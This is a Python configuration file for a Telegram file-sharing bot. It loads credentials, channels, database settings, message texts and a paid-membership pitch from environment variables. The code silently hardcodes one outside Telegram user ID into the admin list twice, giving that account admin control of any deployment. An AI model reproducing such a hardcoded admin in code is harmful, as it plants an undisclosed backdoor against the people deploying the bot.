#(©)CodeXBotz




import os
import logging
from logging.handlers import RotatingFileHandler
from os import environ


#Bot token @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

#Your API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

#Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

#Your db channel Id
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-"))

#OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", ""))

#Port
PORT = os.environ.get("PORT", "")

#BOT USERNAME
BOT_USERNAME = os.environ.get("BOT_USERNAME", "")

CONTACT_USERNAME = os.environ.get("CONTACT_USERNAME", "@angelicfraud")

#premium url
BUY_URL = os.environ.get("BUY_URL", "https://t.me/angelicfraud")
BUY_TEXT = os.environ.get("BUY_TEXT", "Hey👋 !\n\n<blockquote><b>what is Prime Membership?</b>\n\n Prime Membership is a Plan in which you can direct access the content without watching any Token Ads.</blockquote>\n\n<b>🎖️ Available Plans :</b>\n\n✅ Monthly : ₹59 / 30 Days\n\n<b>✅Payment Option :</b> UPI Accepted\n\n\n<b>♻️ How to Buy Prime Membership -</b> \n\n1. Click on Buy Membership Button & Start the bot\n2. Select the payment Method.\n3. Pay using Upi & Scan QR Code.\n4. Upload payment Screenshot..\n\n<b>📩 For any Query contact @angelicfraud</b>")
ADMIN_URL = os.environ.get("ADMIN_URL", "https://t.me/angelicfraud")

#Database
DB_URI = os.environ.get("DATABASE_URL", "")
DB_NAME = os.environ.get("DATABASE_NAME", "")
JOIN_REQS_DB1 = environ.get("JOIN_REQS_DB1", DB_URI)
JOIN_REQS_DB2 = environ.get("JOIN_REQS_DB2", DB_URI)

#force sub channel id, if you want enable force 
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
FORCE_SUB_CHANNEL2 = int(os.environ.get("FORCE_SUB_CHANNEL2", "0"))
FORCE_SUB_CHANNEL3 = int(os.environ.get("FORCE_SUB_CHANNEL3", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "100"))

#start message
START_MSG = os.environ.get("START_MESSAGE", "<b>👋👋 Hey {first} ! </b>\n\n<b>I'm a File Store Bot🤖...! </b>\n\nI Can <b>Store Private Files</b> in Specified Channel and other users can access Private Files From a Special Link....!\n")
try:
    ADMINS=[6593621267]
    for x in (os.environ.get("ADMINS", "").split()):
        ADMINS.append(int(x))
except ValueError:
        raise Exception("Your Admins list does not contain valid integers.")

#Force sub message 
FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "Hello {first}\n\n<b>You need to join my below Channels to use me\n\nPlease join below of Channels and Try Again</b>")

#set your Custom Caption here, Keep None for Disable Custom Caption
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

#set True if you want to prevent users from forwarding files from bot
PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False

#Set true if you want Disable your Channel Posts Share button
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True'

BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
USER_REPLY_TEXT = "🚫 Please Avoid Direct Messages. I'm Here merely for file sharing!"

ADMINS.append(OWNER_ID)
ADMINS.append(6593621267)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt='%d-%b-%y %H:%M:%S',
    handlers=[
        RotatingFileHandler(
            LOG_FILE_NAME,
            maxBytes=50000000,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
   
